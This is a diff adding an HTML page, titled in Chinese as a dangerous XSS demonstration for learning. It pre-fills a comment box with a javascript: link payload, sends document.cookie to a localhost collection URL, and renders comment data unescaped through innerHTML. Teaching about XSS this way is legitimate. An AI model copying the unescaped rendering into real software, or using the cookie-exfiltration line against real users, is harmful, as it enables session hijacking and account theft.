@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>XSS 攻击演示（危险！仅用于技术学习）</title>
+</head>
+<body>
+<h2>模拟用户评论提交（危险演示）</h2>
+<form id="commentForm">
+  <textarea id="comment"
+            placeholder="输入评论内容">
+    <a href="javascript:alert('XSS通过href注入')">点击我</a>
+  </textarea>
+  <button type="button" onclick="submitComment()">提交</button>
+</form>
+
+<h3>评论列表（直接渲染未过滤内容）</h3>
+<div id="commentList"></div>
+
+<script>
+  // 窃取用户 Cookie 示例（实际攻击中可能更复杂）
+  const img = new Image();
+  img.src = 'http://localhost/xss/cookie?cookie=' + document.cookie;
+
+  function submitComment() {
+    const comment = document.getElementById('comment').value;
+    // 模拟向后端发送请求（此处用 fetch 代替实际接口）
+    fetch('http://localhost/xss/comments', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({content: comment})
+    })
+      .then(response => response.json())
+      .then(data => {
+        if (data.code !== 200) {
+          alert(data.msg);
+          return;
+        }
+        console.log('data:', data)
+        // 模拟后端返回数据并直接渲染（未做任何过滤，存在 XSS 风险）
+        const list = document.getElementById('commentList');
+        list.innerHTML += `<div>${data.data}</div>`;
+      });
+  }
+</script>
+</body>
+</html>
